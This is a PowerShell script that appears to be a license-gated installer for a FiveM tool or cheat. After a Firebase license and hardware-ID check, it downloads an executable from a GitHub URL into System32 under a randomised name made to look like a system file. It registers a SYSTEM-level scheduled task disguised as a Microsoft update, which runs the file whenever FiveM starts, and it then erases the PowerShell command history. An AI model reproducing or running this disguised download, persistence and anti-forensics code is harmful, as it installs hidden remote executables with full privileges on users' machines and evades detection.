$ErrorActionPreference = "SilentlyContinue"

# --- [ CONFIGURATION ] ---
$DbUrl = "https://project-8a76e-default-rtdb.asia-southeast1.firebasedatabase.app/licenses"

function Get-HWID {
    return (Get-CimInstance Win32_ComputerSystemProduct).UUID
}
# -------------------------

# --- [ LOGIN SYSTEM ] ---
Clear-Host
Write-Host "--- SECXION SYSTEM LOGIN ---" -ForegroundColor Yellow
$key = Read-Host "Enter License Key"
$myHwid = Get-HWID

Write-Host "Connecting to Firebase..." -ForegroundColor Cyan

try {
    $data = Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Get

    if ($null -eq $data) {
        Write-Host "Error: Key not found in database!" -ForegroundColor Red
        Start-Sleep 2 ; exit
    }

    if ($data.status -ne "active") {
        Write-Host "Error: This key has been disabled or expired." -ForegroundColor Red
        Start-Sleep 2 ; exit
    }

    if ([string]::IsNullOrEmpty($data.hwid)) {
        $payload = @{ hwid = $myHwid } | ConvertTo-Json
        Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Patch -Body $payload
        Write-Host "Success: HWID registered to this PC!" -ForegroundColor Green
    } 
    elseif ($data.hwid -ne $myHwid) {
        Write-Host "Error: HWID Mismatch! Key is locked to another PC." -ForegroundColor Red
        Write-Host "Contact Admin to reset your HWID." -ForegroundColor Gray
        Start-Sleep 3 ; exit
    }

    Write-Host "Access Granted! Welcome." -ForegroundColor Green
    Start-Sleep 1

} catch {
    Write-Host "Connection Error! Check your internet or Firebase Rules." -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Gray
    Start-Sleep 3 ; exit
}
# -------------------------

# --- [ ORIGINAL CODE START ] ---
$p_rand = @("font","drv","host","win","svc") | Get-Random
$m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
$r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
$fileName = "$p_rand$m_rand`_$r_rand.exe"
$taskName = "Microsoft_Update_$r_rand"
$destPath = "C:\Windows\System32\$fileName"
$exeUrl   = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhost.exe"

while ($true) {
    Clear-Host
    Write-Host "1. Install & Persistence"
    Write-Host "2. Check Status"
    Write-Host "0. Exit"

    $choice = Read-Host "Select"

    if ($choice -eq "1") {
        Clear-Host
        Write-Host "Installing System..." -ForegroundColor Cyan

        try {
            Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing -UserAgent "Mozilla/5.0"
            Unblock-File -Path $destPath

            auditpol /set /subcategory:"Process Creation" /success:enable
            $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName']='C:\Users\$env:USERNAME\AppData\Local\FiveM\FiveM.exe']]"
            schtasks /create /tn "$taskName" /tr "$destPath" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f

            Write-Host "Install complete!" -ForegroundColor Green
            Write-Host "SECXIONN will run automatically when FiveM starts." -ForegroundColor Yellow
            
            Clear-History
            Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
        }
        catch {
            Write-Host "Install failed!" -ForegroundColor Red
            Write-Host $_.Exception.Message -ForegroundColor Yellow
        }
        pause
    }
    elseif ($choice -eq "2") {
        Clear-Host
        Write-Host "--- SYSTEM INFO ---" -ForegroundColor Cyan
        if (Test-Path $destPath) {
            Write-Host "Status: Ready" -ForegroundColor Green
            Write-Host "File  : $fileName"
            Write-Host "Task  : $taskName"
        } else {
            Write-Host "Status: Not Installed" -ForegroundColor Red
        }
        pause
    }
  elseif ($choice -eq "0") {
        # คำสั่งล้างข้อความในไฟล์ประวัติ (ไฟล์ยังอยู่แต่ข้อมูลข้างในหายหมด)
        $p="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if(Test-Path $p){ Clear-Content $p -Force }
        
        exit
    }
}
